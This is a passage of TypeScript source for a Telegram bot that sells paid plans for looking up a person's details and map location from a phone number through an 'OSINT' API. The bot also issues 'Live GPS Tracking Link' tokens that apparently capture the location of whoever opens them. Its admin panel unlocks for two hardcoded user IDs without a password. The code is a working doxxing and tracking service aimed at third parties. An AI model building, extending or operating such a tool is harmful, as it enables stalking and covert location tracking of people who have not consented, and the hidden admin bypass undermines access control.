    `<b>• ${toThinSans('Refer Bonus')}:</b> +${toThinSans(String(cfg.referralBonusCredits))} ${toThinSans('Credits')}`;

  const keyboard = [
    [
      buildInlineButton(`❖ ${toThinSans('Change Number API')}`, {
        callback_data: 'adm_prompt_osint_api',
        style: 'success',
      }),
    ],
    [
      buildInlineButton(
        `◈ ${toThinSans(`Image: ${cfg.bannerEnabled ? 'ON' : 'OFF'}`)}`,
        {
          callback_data: 'adm_toggle_start_media',
          style: cfg.bannerEnabled ? 'success' : 'danger',
        }
      ),
      buildInlineButton(`⊕ ${toThinSans('Set Image')}`, {
        callback_data: 'adm_prompt_set_media',
        style: 'success',
      }),
    ],
    [
      buildInlineButton(`⟐ ${toThinSans('Set Channel')}`, {
        callback_data: 'adm_prompt_channel_url',
        style: 'primary',
      }),
      buildInlineButton(`⟐ ${toThinSans('Set Group')}`, {
        callback_data: 'adm_prompt_group_url',
        style: 'success',
      }),
    ],
    [
      buildInlineButton(`◈ ${toThinSans('Open Channel')}`, {
        url: formattedChannel,
        style: 'primary',
      }),
      buildInlineButton(`◈ ${toThinSans('Open Group')}`, {
        url: formattedGroup,
        style: 'success',
      }),
    ],
    [
      buildInlineButton(`✦ ${toThinSans(`Refer (+${cfg.referralBonusCredits})`)}`, {
        callback_data: 'adm_prompt_referral_bonus',
        style: 'primary',
      }),
      buildInlineButton(`« ${toThinSans('Back')}`, { callback_data: 'adm_home', style: 'danger' }),
    ],
  ];

  return {
    text,
    reply_markup: { inline_keyboard: keyboard },
  };
}

function renderInBotAdminToolsSection(notice?: string) {
  const promos = state.config.redeemCodes || [];
  const histCount = state.globalHistory.length;

  const text =
    `<b>❖ ${toThinSans('Broadcast & Promo')}</b>\n` +
    (notice ? `\n<b>✓ ${escapeHtml(toThinSans(notice))}</b>\n` : '') +
    `\n<b>• ${toThinSans('Promo Codes')}:</b> ${toThinSans(String(promos.length))}\n` +
    (promos.length > 0
      ? promos
          .slice(0, 4)
          .map((c) => `• ${escapeHtml(toThinSans(c.code))} (${toThinSans(`${c.vipDays}D VIP, +${c.credits} Cr`)})`)
          .join('\n') + '\n'
      : '') +
    `<b>• ${toThinSans('Total Searches')}:</b> ${toThinSans(String(histCount))}`;

  const keyboard = [
    [
      buildInlineButton(`⟡ ${toThinSans('Send Broadcast')}`, {
        callback_data: 'adm_prompt_broadcast',
        style: 'primary',
      }),
    ],
    [
      buildInlineButton(`✦ ${toThinSans('New Promo')}`, {
        callback_data: 'adm_prompt_create_promo',
        style: 'success',
      }),
      buildInlineButton(`◈ ${toThinSans('History')}`, {
        callback_data: 'adm_list_history',
        style: 'primary',
      }),
    ],
    [buildInlineButton(`« ${toThinSans('Back')}`, { callback_data: 'adm_home', style: 'danger' })],
  ];

  return {
    text,
    reply_markup: { inline_keyboard: keyboard },
  };
}

function renderInBotAdminPromptView(title: string, instruction: string, backCallback = 'adm_home') {
  const text = `<b>❖ ${escapeHtml(toThinSans(title))}</b>\n\n${instruction}`;
  return {
    text,
    reply_markup: {
      inline_keyboard: [[buildInlineButton(`« ${toThinSans('Cancel')}`, { callback_data: backCallback, style: 'danger' })]],
    },
  };
}

// ============================================================================
// TELEGRAM UPDATE HANDLER
// ============================================================================
async function handleTelegramUpdate(update: any) {
  try {
    if (update.message) {
      const msg = update.message;
      const chatId = msg.chat.id;
      const text = (msg.text || msg.caption || '').trim();
      const tgUser = msg.from;
      if (!tgUser) return;

      const startPayload = text.startsWith('/start ') ? text.slice(7).trim() : undefined;
      const user = getOrCreateUser(tgUser, startPayload);

      if (user.isBanned && !text.toLowerCase().startsWith('/admin')) {
        await sendReplyMessage(
          chatId,
          user,
          {
            text: `<b>✕ ${toThinSans('Access Restricted')}</b>\n\n${toThinSans('Your account has been suspended by the administrator.')}`,
            reply_markup: { inline_keyboard: [] },
          },
          msg.message_id
        );
        return;
      }

      const pending = pendingAdminActions.get(user.id);
      if (pending && pending.type === 'SET_MEDIA_UPLOAD_OR_URL') {
        if (Array.isArray(msg.photo) && msg.photo.length > 0) {
          const bestPhoto = msg.photo[msg.photo.length - 1];
          state.config.telegramFileId = bestPhoto.file_id;
          state.config.mediaType = 'photo';
          state.config.bannerEnabled = true;
          saveState();
          pendingAdminActions.delete(user.id);
          await sendReplyMessage(
            chatId,
            user,
            renderInBotAdminConfigSection('Start Photo saved & enabled!'),
            msg.message_id
          );
          return;
        }
        if (msg.video || msg.animation) {
          const fileId = (msg.video || msg.animation).file_id;
          state.config.telegramFileId = fileId;
          state.config.mediaType = 'video';
          state.config.bannerEnabled = true;
          saveState();
          pendingAdminActions.delete(user.id);
          await sendReplyMessage(
            chatId,
            user,
            renderInBotAdminConfigSection('Start Video saved & enabled!'),
            msg.message_id
          );
          return;
        }
      }

      if (pending && !text.startsWith('/start')) {
        pendingAdminActions.delete(user.id);
        const replyAdminScreen = async (view: { text: string; reply_markup: any }) => {
          if (user.lastBotMessageId) {
            await editSectionInPlace(chatId, user.lastBotMessageId, user, view);
          } else {
            await sendReplyMessage(chatId, user, view, msg.message_id);
          }
        };

        if (pending.type === 'AUTH_PASSWORD') {
          if (text === state.config.adminPassword) {
            user.isAdminUnlocked = true;
            saveState();
            await replyAdminScreen(renderInBotAdminHomeView('Admin Panel Unlocked'));
          } else {
            await replyAdminScreen({
              text: `<b>✕ ${toThinSans('Invalid Admin Password')}</b>\n\n${toThinSans('Access denied.')}`,
              reply_markup: {
                inline_keyboard: [[buildInlineButton(`« ${toThinSans('Back')}`, { callback_data: 'nav_home', style: 'danger' })]],
              },
            });
          }
          return;
        }

        if (pending.type === 'SET_MEDIA_UPLOAD_OR_URL') {
          const cleanUrl = text.trim();
          if (cleanUrl.startsWith('http')) {
            const isVid = /\.(mp4|webm|mov)(\?|$)/i.test(cleanUrl);
            state.config.telegramFileId = undefined;
            if (isVid) {
              state.config.bannerVideoUrl = cleanUrl;
              state.config.mediaType = 'video';
            } else {
              state.config.bannerUrl = await resolveBannerImageUrlAsync(cleanUrl);
              state.config.mediaType = 'photo';
            }
            state.config.bannerEnabled = true;
            saveState();
            await replyAdminScreen(renderInBotAdminConfigSection('Start Image URL updated!'));
          } else {
            await replyAdminScreen(renderInBotAdminConfigSection('Send a valid URL or upload a Photo/Video'));
          }
          return;
        }

        if (pending.type === 'GIVE_VIP_USERNAME') {
          const parts = text.split(/\s+/);
          const identifier = parts[0];
          const days = Math.max(1, Number(parts[1] || 7));
          const target = resolveUserByIdentifier(identifier);
          if (target) {
            const now = new Date();
            const base = target.premiumUntil && new Date(target.premiumUntil) > now ? new Date(target.premiumUntil) : now;
            base.setDate(base.getDate() + days);
            target.isPremium = true;
            target.premiumUntil = base.toISOString();
            target.lastPlanName = `${days} Days Admin VIP`;
            saveState();
            await replyAdminScreen(
              renderInBotAdminGrantSection(
                `Granted ${days} Days VIP to ${target.firstName} (${target.username ? '@' + target.username : target.id})`
              )
            );
          } else {
            await replyAdminScreen(renderInBotAdminGrantSection('User not found.'));
          }
          return;
        }

        if (pending.type === 'ADD_CREDITS_USERNAME') {
          const parts = text.split(/\s+/);
          const identifier = parts[0];
          const creditsToAdd = Number(parts[1] || 5);
          const target = resolveUserByIdentifier(identifier);
          if (target && !isNaN(creditsToAdd)) {
            target.credits = Math.max(0, target.credits + creditsToAdd);
            target.dailyLimit = Math.max(getUserDailyLimit(target), target.credits);
            saveState();
            await replyAdminScreen(
              renderInBotAdminGrantSection(
                `Added ${creditsToAdd} Credits to ${target.firstName} (Now: ${target.credits})`
              )
            );
          } else {
            await replyAdminScreen(renderInBotAdminGrantSection('Invalid format. Use: @username 10'));
          }
          return;
        }

        if (pending.type === 'SET_USER_DAILY_LIMIT') {
          const parts = text.split(/\s+/);
          const identifier = parts[0];
          const newLimit = Number(parts[1]);
          const target = resolveUserByIdentifier(identifier);
          if (target && !isNaN(newLimit) && newLimit >= 0) {
            target.dailyLimit = newLimit;
            target.dailyLookupsUsed = 0;
            target.credits = newLimit;
            saveState();
            await replyAdminScreen(
              renderInBotAdminGrantSection(
                `Set Daily Limit of ${target.firstName} to ${newLimit}/Day`
              )
            );
          } else {
            await replyAdminScreen(renderInBotAdminGrantSection('Format: @username <daily_limit>'));
          }
          return;
        }

        if (pending.type === 'REVOKE_VIP_USERNAME') {
          const target = resolveUserByIdentifier(text.split(/\s+/)[0]);
          if (target) {
            target.isPremium = false;
            target.premiumUntil = null;
            saveState();
            await replyAdminScreen(renderInBotAdminGrantSection(`Removed VIP from ${target.firstName}`));
          } else {
            await replyAdminScreen(renderInBotAdminGrantSection('User not found.'));
          }
          return;
        }

        if (pending.type === 'FIND_USER') {
          const target = resolveUserByIdentifier(text.split(/\s+/)[0]);
          if (target) {
            await replyAdminScreen(renderInBotAdminUserDetail(target));
          } else {
            await replyAdminScreen(renderInBotAdminUsersSection('all', 'User not found'));
          }
          return;
        }

        if (pending.type === 'BAN_USER') {
          const target = resolveUserByIdentifier(text.split(/\s+/)[0]);
          if (target) {
            target.isBanned = !target.isBanned;
            saveState();
            await replyAdminScreen(
              renderInBotAdminUsersSection('all', `${target.firstName} is now ${target.isBanned ? 'BANNED' : 'UNBANNED'}`)
            );
          } else {
            await replyAdminScreen(renderInBotAdminUsersSection('all', 'User not found'));
          }
          return;
        }

        if (pending.type === 'PLAN_SET_PRICE') {
          const plan = state.config.plans.find((p) => p.id === pending.planId);
          const newPrice = Number(text.replace(/[^\d.]/g, ''));
          if (plan && !isNaN(newPrice) && newPrice > 0) {
            plan.price = newPrice;
            saveState();
            await replyAdminScreen(renderInBotAdminSinglePlanEditor(plan, `Price updated to ₹${newPrice}`));
          } else {
            await replyAdminScreen(renderInBotAdminPlansSection('Invalid price'));
          }
          return;
        }

        if (pending.type === 'PLAN_SET_DAYS') {
          const plan = state.config.plans.find((p) => p.id === pending.planId);
          const newDays = Number(text.replace(/\D/g, ''));
          if (plan && !isNaN(newDays) && newDays > 0) {
            plan.days = newDays;
            plan.badge = `${newDays} ${newDays === 1 ? 'DAY' : 'DAYS'}`;
            saveState();
            await replyAdminScreen(renderInBotAdminSinglePlanEditor(plan, `Days updated to ${newDays} Days`));
          } else {
            await replyAdminScreen(renderInBotAdminPlansSection('Invalid days'));
          }
          return;
        }

        if (pending.type === 'PLAN_SET_NAME') {
          const plan = state.config.plans.find((p) => p.id === pending.planId);
          if (plan && text.length > 0) {
            plan.name = text.slice(0, 28);
            saveState();
            await replyAdminScreen(renderInBotAdminSinglePlanEditor(plan, `Plan renamed to ${plan.name}`));
          } else {
            await replyAdminScreen(renderInBotAdminPlansSection());
          }
          return;
        }

        if (pending.type === 'ADD_NEW_PLAN') {
          const parts = text.split(/\s+/);
          const days = Number(parts[0]);
          const price = Number(parts[1]);
          const name = parts.slice(2).join(' ') || `${days} Days Pass`;
          if (!isNaN(days) && days > 0 && !isNaN(price) && price > 0) {
            state.config.plans.push({
              id: `plan_${Date.now()}`,
              name,
              days,
              price,
              credits: 0,
              badge: `${days} DAYS`,
              description: `Unlimited Number Lookups for ${days} Days`,
              buttonStyle: 'success',
            });
            saveState();
            await replyAdminScreen(renderInBotAdminPlansSection(`Added ${name} (₹${price} / ${days}D)`));
          } else {
            await replyAdminScreen(renderInBotAdminPlansSection('Format: <days> <price> <name>'));
          }
          return;
        }

        if (pending.type === 'SET_TRIAL_CREDITS' || pending.type === 'SET_DAILY_LIMIT') {
          const num = Number(text.replace(/\D/g, ''));
          if (!isNaN(num) && num >= 0) {
            state.config.dailyLookupLimit = num;
            state.config.defaultTrialCredits = num;
            for (const u of Object.values(state.users)) {
              if (!u.isPremium) {
                u.dailyLimit = num;
                u.credits = Math.max(0, num - (u.dailyLookupsUsed || 0));
              }
            }
            saveState();
            await replyAdminScreen(renderInBotAdminHomeView(`Free User Daily Limit set to ${num} / Day`));
          } else {
            await replyAdminScreen(renderInBotAdminHomeView('Invalid number'));
          }
          return;
        }

        if (pending.type === 'SET_LIVE_LIMIT') {
          const num = Number(text.replace(/\D/g, ''));
          if (!isNaN(num) && num >= 0) {
            state.config.liveLocationLifetimeLimit = num;
            for (const u of Object.values(state.users)) {
              if (!u.isPremium) {
                u.liveLocationLimit = num;
              }
            }
            saveState();
            await replyAdminScreen(renderInBotAdminHomeView(`Free Live Location Limit set to ${num} / Lifetime`));
          } else {
            await replyAdminScreen(renderInBotAdminHomeView('Invalid number'));
          }
          return;
        }

        if (pending.type === 'MANUAL_ORDER') {
          const parts = text.split(/\s+/);
          const identifier = parts[0];
          const days = Math.max(1, Number(parts[1] || 7));
          const amount = Math.max(1, Number(parts[2] || 29));
          const target = resolveUserByIdentifier(identifier);
          if (target) {
            const orderId = `HEX_MAN_${Date.now().toString().slice(-5)}`;
            const order: PaymentOrder = {
              orderId,
              userId: target.id,
              userName: target.firstName,
              userUsername: target.username,
              planId: 'manual_vip',
              planName: `${days} Days VIP`,
              amount,
              credits: 0,
              days,
              status: 'PENDING',
              paymentUrl: '',
              upiIntentUrl: '',
              qrPayload: '',
              gatewaySource: 'famgateway',
              createdAt: new Date().toISOString(),
            };
            state.orders[orderId] = order;
            fulfillOrder(order, 'ADMIN_MANUAL');
            await replyAdminScreen(
              renderInBotAdminEarningsSection(`Added ₹${amount} & ${days}D VIP for ${target.firstName}`)
            );
          } else {
            await replyAdminScreen(renderInBotAdminEarningsSection('User not found'));
          }
          return;
        }

        if (pending.type === 'SET_CHANNEL_URL') {
          const clean = text.trim();
          const formattedUrl = clean.startsWith('http')
            ? clean
            : `https://t.me/${clean.replace(/^@/, '')}`;
          state.config.channelUrl = formattedUrl;
          saveState();
          await replyAdminScreen(renderInBotAdminConfigSection('Channel link updated'));
          return;
        }

        if (pending.type === 'SET_GROUP_URL') {
          const clean = text.trim();
          const formattedUrl = clean.startsWith('http')
            ? clean
            : `https://t.me/${clean.replace(/^@/, '')}`;
          state.config.groupUrl = formattedUrl;
          saveState();
          await replyAdminScreen(renderInBotAdminConfigSection('Group link updated'));
          return;
        }

        if (pending.type === 'SET_WELCOME_TEXT') {
          state.config.welcomeText = text;
          saveState();
          await replyAdminScreen(renderInBotAdminConfigSection('Welcome text updated'));
          return;
        }

        if (pending.type === 'SET_OSINT_API') {
          const raw = text.trim();
          const parts = raw.split(/\s+/);
          if (parts[0] && parts[0].startsWith('http')) {
            let apiUrl = parts[0];
            let apiKey = parts[1] !== undefined ? parts[1] : state.config.osintApiKey;
            try {
              const parsedU = new URL(apiUrl);
              const extractedKey =
                parsedU.searchParams.get('key') ||
                parsedU.searchParams.get('api_key') ||
                parsedU.searchParams.get('apikey') ||
                parsedU.searchParams.get('token');
              if (extractedKey && !parts[1]) {
                apiKey = extractedKey;
              }
            } catch {
              // keep raw URL
            }
            state.config.osintApiUrl = apiUrl;
            if (apiKey !== undefined) {
              state.config.osintApiKey = apiKey;
            }
            numberInfoCache.clear();
            saveState();
            await replyAdminScreen(renderInBotAdminConfigSection('Number Info API updated'));
          } else if (raw.length >= 3) {
            state.config.osintApiKey = raw;
            numberInfoCache.clear();
            saveState();
            await replyAdminScreen(renderInBotAdminConfigSection('Number Info API Key updated'));
          } else {
            await replyAdminScreen(renderInBotAdminConfigSection('Invalid API URL or Key'));
          }
          return;
        }

        if (pending.type === 'SET_REFERRAL_BONUS') {
          const num = Number(text.replace(/\D/g, ''));
          if (!isNaN(num) && num >= 0) {
            state.config.referralBonusCredits = num;
            saveState();
            await replyAdminScreen(renderInBotAdminConfigSection(`Referral Bonus set to +${num}`));
          } else {
            await replyAdminScreen(renderInBotAdminConfigSection('Invalid number'));
          }
          return;
        }

        if (pending.type === 'CREATE_PROMO') {
          const parts = text.split(/\s+/);
          const code = (parts[0] || '').toUpperCase().replace(/[^A-Z0-9_-]/g, '');
          const vipDays = Math.max(0, Number(parts[1] || 7));
          const credits = Math.max(0, Number(parts[2] || 0));
          if (code.length >= 3) {
            state.config.redeemCodes = state.config.redeemCodes.filter((c) => c.code !== code);
            state.config.redeemCodes.unshift({
              code,
              vipDays,
              credits,
              maxUses: 100,
              usedBy: [],
              createdAt: new Date().toISOString(),
            });
            saveState();
            await replyAdminScreen(renderInBotAdminToolsSection(`Created Promo ${code} (${vipDays}D VIP)`));
          } else {
            await replyAdminScreen(renderInBotAdminToolsSection('Invalid code format'));
          }
          return;
        }

        if (pending.type === 'BROADCAST') {
          let sent = 0;
          for (const u of Object.values(state.users)) {
            if (typeof u.id === 'number' && u.id < 900000000) {
              try {
                await callTelegram('sendMessage', {
                  chat_id: u.id,
                  text: `<b>⟐ ${escapeHtml(toThinSans(state.config.botName))}</b>\n\n${escapeHtml(text)}`,
                  parse_mode: 'HTML',
                });
                sent++;
              } catch {
                // ignore
              }
            }
          }
          await replyAdminScreen(renderInBotAdminToolsSection(`Broadcast sent to ${sent} users`));
          return;
        }
      }

      // 1. /start command — ONLY message that sends the banner image!
      if (text.startsWith('/start')) {
        await sendReplyMessage(chatId, user, renderBotHomeView(user), msg.message_id);
        addLog('BOT_MESSAGE', 'Started bot (/start)', user.id, user.firstName);
        return;
      }

      // 2. Hidden /admin or ZX10R command
      if (text.toLowerCase().startsWith('/admin') || text === state.config.adminPassword) {
        const arg = text.toLowerCase().startsWith('/admin') ? text.slice(6).trim() : text;
        if (arg === state.config.adminPassword || user.isAdminUnlocked) {
          user.isAdminUnlocked = true;
          saveState();
          await sendReplyMessage(chatId, user, renderInBotAdminHomeView(), msg.message_id);
          return;
        } else {
          pendingAdminActions.set(user.id, { type: 'AUTH_PASSWORD' });
          await sendReplyMessage(
            chatId,
            user,
            {
              text: `<b>⌘ ${toThinSans('Admin Authentication')}</b>\n\n${toThinSans('Send the capital admin password in chat to unlock the Admin Panel:')}`,
              reply_markup: {
                inline_keyboard: [[buildInlineButton(`« ${toThinSans('Back')}`, { callback_data: 'nav_home', style: 'danger' })]],
              },
            },
            msg.message_id
          );
          return;
        }
      }

      // 3. /premium, /vip, /plans command
      if (
        text.toLowerCase().startsWith('/premium') ||
        text.toLowerCase().startsWith('/vip') ||
        text.toLowerCase().startsWith('/plans')
      ) {
        await sendReplyMessage(chatId, user, renderBotPricingView(user), msg.message_id);
        return;
      }

      // 4. /profile, /myprofile, /account command
      if (
        text.toLowerCase().startsWith('/profile') ||
        text.toLowerCase().startsWith('/myprofile') ||
        text.toLowerCase().startsWith('/account')
      ) {
        await sendReplyMessage(chatId, user, renderBotProfileView(user), msg.message_id);
        return;
      }

      // 5. /search, /info, /number, /location command
      if (
        text.toLowerCase().startsWith('/search') ||
        text.toLowerCase().startsWith('/info') ||
        text.toLowerCase().startsWith('/number') ||
        text.toLowerCase().startsWith('/location')
      ) {
        await sendReplyMessage(chatId, user, renderBotNumberPromptView(user), msg.message_id);
        return;
      }

      // 5b. /live command
      if (text.toLowerCase().startsWith('/live')) {
        await sendReplyMessage(chatId, user, renderBotLiveLocationView(user), msg.message_id);
        return;
      }

      // 6. /history command
      if (text.toLowerCase().startsWith('/history')) {
        await sendReplyMessage(chatId, user, renderBotHistoryView(user), msg.message_id);
        return;
      }

      // 7. /redeem command
      if (text.toLowerCase().startsWith('/redeem')) {
        const codeStr = text.slice(7).trim().toUpperCase();
        const promo = state.config.redeemCodes.find((c) => c.code.toUpperCase() === codeStr);
        if (!promo) {
          await sendReplyMessage(
            chatId,
            user,
            {
              text: `<b>✕ ${toThinSans('Invalid Promo Code')}</b>\n\n${toThinSans('Code not found or expired.')}`,
              reply_markup: {
                inline_keyboard: [[buildInlineButton(`« ${toThinSans('Back')}`, { callback_data: 'nav_home', style: 'danger' })]],
              },
            },
            msg.message_id
          );
          return;
        }
        if (promo.usedBy.includes(user.id)) {
          await sendReplyMessage(
            chatId,
            user,
            {
              text: `<b>✕ ${toThinSans('Already Redeemed')}</b>\n\n${toThinSans('You have already claimed this code.')}`,
              reply_markup: {
                inline_keyboard: [[buildInlineButton(`« ${toThinSans('Back')}`, { callback_data: 'nav_home', style: 'danger' })]],
              },
            },
            msg.message_id
          );
          return;
        }
        promo.usedBy.push(user.id);
        if (promo.credits > 0) user.credits += promo.credits;
        if (promo.vipDays > 0) {
          const now = new Date();
          const base = user.premiumUntil && new Date(user.premiumUntil) > now ? new Date(user.premiumUntil) : now;
          base.setDate(base.getDate() + promo.vipDays);
          user.isPremium = true;
          user.premiumUntil = base.toISOString();
          user.lastPlanName = `Promo (${promo.code})`;
        }
        saveState();
        await sendReplyMessage(
          chatId,
          user,
          {
            text: `<b>✦ ${toThinSans('Promo Redeemed')} — ${escapeHtml(toThinSans(promo.code))}</b>\n\n<b>${toThinSans('Status')}:</b> ${getUserStatusBadge(user)}`,
            reply_markup: {
              inline_keyboard: [[buildInlineButton(`« ${toThinSans('Back')}`, { callback_data: 'nav_home', style: 'danger' })]],
            },
          },
          msg.message_id
        );
        return;
      }

      // 8. Phone number to location lookup (Premium = Unlimited, Normal User = 2 Daily Limit)
      const digitsOnly = text.replace(/\D/g, '');
      if (digitsOnly.length >= 10 && digitsOnly.length <= 13) {
        const { isVip, dailyLimit, remainingToday } = syncUserDailyUsage(user);
        if (!isVip && remainingToday <= 0) {
          await sendReplyMessage(
            chatId,
            user,
            renderBotLimitReachedView(user),
            msg.message_id
          );
          return;
        }

        const info = await fetchRealNumberInfo(text);
        if (!info.valid) {
          await sendReplyMessage(
            chatId,
            user,
            {
              text: `<b>✕ ${toThinSans('Invalid Phone Number')}</b>\n\n${toThinSans('Send any valid 10-digit mobile number (Ex: 9876543210).')}`,
              reply_markup: {
                inline_keyboard: [[buildInlineButton(`« ${toThinSans('Back')}`, { callback_data: 'nav_home', style: 'danger' })]],
              },
            },
            msg.message_id
          );
          return;
        }

        user.dailyLookupsUsed += 1;
        user.lastLookupDate = getTodayDateString();
        if (!isVip) {
          user.credits = Math.max(0, dailyLimit - user.dailyLookupsUsed);
        }
        user.totalLookups += 1;
        recordLookupHistory(user, info, 'bot');
        addLog('LOOKUP', `Number to Location ${info.rawDigits} (${info.records[0]?.name || info.areaLabel})`, user.id, user.firstName);

        await sendReplyMessage(chatId, user, renderBotNumberResultView(user, info, (user as any).lookupMode === 'location' ? 'location' : 'info'), msg.message_id);
        return;
      }

      // Default fallback -> reply with home text (no image unless /start)
      await sendReplyMessage(
        chatId,
        user,
        {
          ...renderBotHomeView(user),
          withMedia: false,
        },
        msg.message_id
      );
    } else if (update.callback_query) {
      const cb = update.callback_query;
      const chatId = cb.message?.chat?.id;
      const messageId = cb.message?.message_id;
      const isMediaMsg = Boolean(cb.message?.photo || cb.message?.video || cb.message?.animation);
      const data = cb.data || '';
      const tgUser = cb.from;
      if (!chatId || !messageId || !tgUser) return;

      const user = getOrCreateUser(tgUser);
      user.lastBotMessageId = messageId;
      user.lastBotMessageHasPhoto = isMediaMsg;

      if (data.startsWith('adm_') || data.startsWith('nav_')) {
        pendingAdminActions.delete(user.id);
      }

      const ackCallback = (opts: Record<string, any> = {}) => {
        callTelegram('answerCallbackQuery', { callback_query_id: cb.id, ...opts }, 4000).catch(() => {});
      };

      if (data === 'nav_home' || data === 'back_home' || data === 'home') {
        ackCallback();
        await editSectionInPlace(chatId, messageId, user, renderBotHomeView(user), isMediaMsg);
      } else if (data === 'nav_num_info' || data === 'num_to_info' || data === 'search_num') {
      (user as any).lookupMode = 'info';
      saveState();
      ackCallback({ text: toThinSans('Send any 10-digit mobile number for Info') });
      await editSectionInPlace(chatId, messageId, user, renderBotNumberPromptView(user), isMediaMsg);
    } else if (data === 'nav_num_loc' || data === 'num_to_loc') {
      (user as any).lookupMode = 'location';
      saveState();
      ackCallback({ text: toThinSans('Send any 10-digit mobile number for Location') });
      await editSectionInPlace(chatId, messageId, user, renderBotNumberPromptView(user), isMediaMsg);
    } else if (data.startsWith('loc_')) {
      const num = data.replace('loc_', '').trim();
      ackCallback({ text: toThinSans(`Loading Location for ${num}...`) });
      const info = await fetchRealNumberInfo(num);
      if (info.valid) {
        await editSectionInPlace(chatId, messageId, user, renderBotNumberResultView(user, info, 'location'), isMediaMsg);
      }
    } else if (data.startsWith('info_')) {
      const num = data.replace('info_', '').trim();
      ackCallback({ text: toThinSans(`Loading Details for ${num}...`) });
      const info = await fetchRealNumberInfo(num);
      if (info.valid) {
        await editSectionInPlace(chatId, messageId, user, renderBotNumberResultView(user, info, 'info'), isMediaMsg);
      }
    } else if (data === 'nav_live_loc' || data === 'live_location') {
        ackCallback();
        await editSectionInPlace(chatId, messageId, user, renderBotLiveLocationView(user), isMediaMsg);
      } else if (data === 'create_live_link') {
        const { isVip, remainingLifetime } = syncUserLiveUsage(user);
        if (!isVip && remainingLifetime <= 0) {
          ackCallback({
            text: toThinSans('Lifetime Free Live Location limit (1/1) reached! Upgrade to VIP.'),
            show_alert: true,
          });
          await editSectionInPlace(chatId, messageId, user, renderBotLiveLimitReachedView(user), isMediaMsg);
          return;
        }
        user.liveLocationUsed = (user.liveLocationUsed || 0) + 1;
        user.activeTrackToken = `LOC${String(user.id).slice(-4)}${Date.now().toString(36).toUpperCase().slice(-4)}`;
        saveState();
        addLog('LOOKUP', `Generated Live Location Link (${user.activeTrackToken})`, user.id, user.firstName);
        ackCallback({ text: toThinSans('Live Location Link Generated!') });
        await editSectionInPlace(
          chatId,
          messageId,
          user,
          renderBotLiveLocationView(user, 'Live GPS Tracking Link Created!'),
          isMediaMsg
        );
      } else if (data.startsWith('pin_')) {
        const num = data.replace('pin_', '').trim();
        ackCallback({ text: toThinSans(`Sending Google Maps Pin for ${num}...`) });
        const info = await fetchRealNumberInfo(num);
        if (info.valid) {
          await callTelegram(
            'sendLocation',
            {
              chat_id: chatId,
              latitude: info.lat,
              longitude: info.lng,
              reply_markup: {
                inline_keyboard: [
                  [buildInlineButton(`🗺️ ${toThinSans('Open in Google Maps')}`, { url: info.mapsUrl, style: 'success' })],
                ],
              },
            },
            5000
          ).catch(() => {});
        }
      } else if (data === 'nav_history' || data === 'open_history') {
        ackCallback();
        await editSectionInPlace(chatId, messageId, user, renderBotHistoryView(user), isMediaMsg);
      } else if (data === 'clear_history') {
        user.history = [];
        user.liveCaptures = [];
        saveState();
        ackCallback({ text: toThinSans('History cleared') });
        await editSectionInPlace(chatId, messageId, user, renderBotHistoryView(user), isMediaMsg);
      } else if (data.startsWith('hist_')) {
        const num = data.replace('hist_', '').trim();
        ackCallback({ text: toThinSans(`Loading ${num}...`) });
        const info = await fetchRealNumberInfo(num);
        if (info.valid) {
          await editSectionInPlace(chatId, messageId, user, renderBotNumberResultView(user, info), isMediaMsg);
        }
      } else if (data === 'nav_profile' || data === 'nav_refer' || data === 'open_profile' || data === 'my_profile') {
        ackCallback();
        await editSectionInPlace(chatId, messageId, user, renderBotProfileView(user), isMediaMsg);
      } else if (
        data === 'nav_pricing' ||
        data === 'buy_premium' ||
        data === 'get_premium' ||
        data === 'open_premium' ||
        data === 'menu_pricing'
      ) {
        ackCallback();
        await editSectionInPlace(chatId, messageId, user, renderBotPricingView(user), isMediaMsg);
      } else if (data.startsWith('buy_plan_') || data.startsWith('buy_')) {
        const rawPlanId = data.replace(/^buy_plan_/, '').replace(/^buy_/, '');
        const plan =
          state.config.plans.find((p) => p.id === rawPlanId) ||
          state.config.plans.find((p) => p.id.includes(rawPlanId)) ||
          state.config.plans[0];
        if (!plan) {
          ackCallback({ text: toThinSans('No plans configured'), show_alert: true });
          return;
        }
        ackCallback({ text: toThinSans(`Generating QR for ₹${plan.price}...`) });
        const order = await createFamGatewayOrder(user, plan);
        await sendBotOrderQrPhoto(chatId, user, order, messageId);
      } else if (data.startsWith('chk_') || data.startsWith('verify_order_')) {
        const orderId = data.replace(/^verify_order_/, '').replace(/^chk_/, '');
        const order = state.orders[orderId];
        if (!order) {
          ackCallback({ text: toThinSans('Order not found'), show_alert: true });
          return;
        }
        const statusResult = await checkFamGatewayOrderStatus(order, true);
        if (statusResult.paid) {
          ackCallback({
            text: `✓ ${toThinSans(`Payment Verified! ${order.days} Days VIP Activated.`)}`,
            show_alert: true,
          });
        } else {
          const amt = order.payableAmount || order.amount;
          ackCallback({
            text: `◈ ${toThinSans(`Payment of ₹${amt} not received yet. Auto-checking in background.`)}`,
            show_alert: true,
          });
        }
      }

      // ======================================================================
      // IN-BOT ADMIN PANEL SECTION CALLBACKS
      // ======================================================================
      else if (data.startsWith('adm_')) {
        if (!user.isAdminUnlocked && (user.id === 6672896116 || user.id === 7995520431)) {
          user.isAdminUnlocked = true;
          saveState();
        }
        if (!user.isAdminUnlocked) {
          pendingAdminActions.set(user.id, { type: 'AUTH_PASSWORD' });
          ackCallback({ text: toThinSans('Enter Admin Password in chat') });
          await editSectionInPlace(
            chatId,
            messageId,
            user,
            {
              text: `<b>🔐 ${toThinSans('Admin Authentication')}</b>\n\n${toThinSans('Send the capital admin password in chat to unlock the Admin Panel:')}`,
              reply_markup: {
                inline_keyboard: [[buildInlineButton(`« ${toThinSans('Back')}`, { callback_data: 'nav_home', style: 'danger' })]],
              },
            },
            isMediaMsg
          );
          return;
        }

        if (data === 'adm_home' || data === 'adm_main' || data === 'adm_back') {
          ackCallback();
          await editSectionInPlace(chatId, messageId, user, renderInBotAdminHomeView(), isMediaMsg);
        } else if (data === 'adm_sec_grant' || data === 'adm_grant') {
          ackCallback();
          await editSectionInPlace(chatId, messageId, user, renderInBotAdminGrantSection(), isMediaMsg);
        } else if (data === 'adm_prompt_give_vip' || data === 'adm_give_vip') {
          pendingAdminActions.set(user.id, { type: 'GIVE_VIP_USERNAME' });
          ackCallback();
          await editSectionInPlace(
            chatId,
            messageId,
            user,
            renderInBotAdminPromptView(
              'Give Premium By @username',
              `${toThinSans('Send @username <days> or <userId> <days> in chat:')}\n\n${toThinSans('Example')}: @rahul 30`,
              'adm_sec_grant'
            ),
            isMediaMsg
          );
        } else if (data === 'adm_prompt_add_credits' || data === 'adm_add_credits') {
